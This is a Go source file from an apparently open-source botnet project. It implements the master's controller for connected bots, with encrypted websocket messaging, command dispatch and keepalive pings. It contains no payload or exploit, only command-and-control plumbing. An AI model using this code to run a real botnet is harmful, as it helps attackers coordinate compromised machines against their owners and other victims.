package master

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"log"
	"time"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/gorilla/websocket"

	uuid "github.com/satori/go.uuid"
)

const (
	writeWait      = 10 * time.Second    // Time allowed to write a message to the peer
	pongWait       = 60 * time.Second    // Time allowed to read the next pong message from the peer
	pingPeriod     = (pongWait * 9) / 10 // Send pings to peer with this period. Must be less than pongWait
	maxMessageSize = 1024                // Maximum message size allowed from peer
)

// SlaveCtrl holds the information the master needs from a connected slave
type SlaveCtrl struct {
	id          string
	slavePubKey *rsa.PublicKey
	WSConn      *websocket.Conn
	CommandChan chan *protocol.Command
	Master      *Master
}

// NewSlaveCtrl is the constructor for a slave controller abstraction
func NewSlaveCtrl(m *Master, slavePubKey string, conn *websocket.Conn) (*SlaveCtrl, error) {
	pubKey, err := encryption.DecodePubKeyPEM([]byte(slavePubKey))
	if err != nil {
		return nil, fmt.Errorf("could not decode pub key: %s", err)
	}
	return &SlaveCtrl{
		id:          uuid.NewV4().String(),
		slavePubKey: pubKey,
		WSConn:      conn,
		CommandChan: make(chan *protocol.Command),
		Master:      m,
	}, nil
}

func (s *SlaveCtrl) reader() {
	s.WSConn.SetReadLimit(maxMessageSize)
	s.WSConn.SetReadDeadline(time.Now().Add(pongWait))
	s.WSConn.SetPongHandler(func(string) error { s.WSConn.SetReadDeadline(time.Now().Add(pongWait)); return nil })
	for {
		// get the next message
		msgType, encryptedMessage, err := s.WSConn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WS connection was closed unexpectedly: %s", err)
			}
			break
		}
		// discard all non binary type (non encrypted) messages
		if msgType != 2 {
			continue
		}
		// decrypt the JSON event and unmarshal onto the event type
		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, s.Master.masterPrivKey)
		if err != nil {
			log.Printf("could not decrypt message from slave %s: %s", s.id, err)
			continue
		}
		var msg protocol.Message
		if err = json.Unmarshal(jsonMsg, &msg); err != nil {
			log.Printf("could not unmarshal message from slave %s: %s", s.id, err)
			continue
		}
		s.Master.receiveMsgChan <- &msg
	}
}

func (s *SlaveCtrl) writer() {
	ticker := time.NewTicker(pingPeriod)
	defer func() {
		ticker.Stop()
		s.WSConn.Close()
	}()
	for {
		select {
		case cmd, ok := <-s.CommandChan:
			s.WSConn.SetWriteDeadline(time.Now().Add(writeWait))
			if !ok {
				log.Println("we shouldnt get here though")
				s.WSConn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}
			cmdJSONBytes, err := json.Marshal(cmd)
			if err != nil {
				return
			}
			encryptedEvent, err := encryption.EncryptMessage(cmdJSONBytes, s.slavePubKey)
			if err != nil {
				return
			}
			s.WSConn.WriteMessage(2, encryptedEvent)
		case <-ticker.C:
			s.WSConn.SetWriteDeadline(time.Now().Add(writeWait))
			if err := s.WSConn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}
